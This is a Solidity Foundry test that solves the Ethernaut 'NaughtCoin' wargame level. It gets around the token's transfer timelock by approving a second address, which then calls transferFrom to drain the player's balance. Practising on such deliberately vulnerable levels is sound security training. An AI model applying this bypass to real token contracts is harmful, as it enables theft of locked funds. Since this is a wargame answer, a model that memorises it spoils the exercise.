// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../src/NaughtCoin/NaughtCoin.sol";
import "../src/NaughtCoin/NaughtCoinFactory.sol";
import "../src/Ethernaut.sol";

contract NaughtCoinTest is Test {
    Ethernaut private _ethernaut;
    NaughtCoinFactory private _naughtCoinFactory;
    NaughtCoin private _naughtCoin;

    address private _hacker = address(0xA);
    address private _hacker2 = address(0xB);
    address private _hacker3 = address(0xC);

    modifier testWrapper() {
        vm.deal(_hacker, 1 ether);
        _ethernaut.registerLevel(_naughtCoinFactory);
        vm.startPrank(_hacker);
        address instance = _ethernaut.createLevelInstance(_naughtCoinFactory);
        _naughtCoin = NaughtCoin(instance);
        _;
        vm.prank(_hacker);
        bool success = _ethernaut.submitLevelInstance(
            payable(address(_naughtCoin))
        );
        assertTrue(success);
    }

    function setUp() public {
        _ethernaut = new Ethernaut();
        _naughtCoinFactory = new NaughtCoinFactory();
    }

    function testNaughtCoinHack() public testWrapper {
        // console2.log("_hacker balance before=", _naughtCoin.balanceOf(_hacker));
        // console2.log(
        //     "_hacker2 balance before=",
        //     _naughtCoin.balanceOf(_hacker2)
        // );
        // console2.log(
        //     "_hacker3 balance before=",
        //     _naughtCoin.balanceOf(_hacker3)
        // );
        uint256 balanceOfHacker = _naughtCoin.balanceOf(_hacker);
        _naughtCoin.approve(_hacker2, balanceOfHacker);

        vm.stopPrank();
        vm.prank(_hacker2);
        bool success = _naughtCoin.transferFrom(
            _hacker,
            _hacker3,
            balanceOfHacker
        );

        assertTrue(success);
        // console2.log("_hacker balance after=", _naughtCoin.balanceOf(_hacker));
        // console2.log(
        //     "_hacker2 balance after=",
        //     _naughtCoin.balanceOf(_hacker2)
        // );
        // console2.log(
        //     "_hacker3 balance after=",
        //     _naughtCoin.balanceOf(_hacker3)
        // );
    }
}
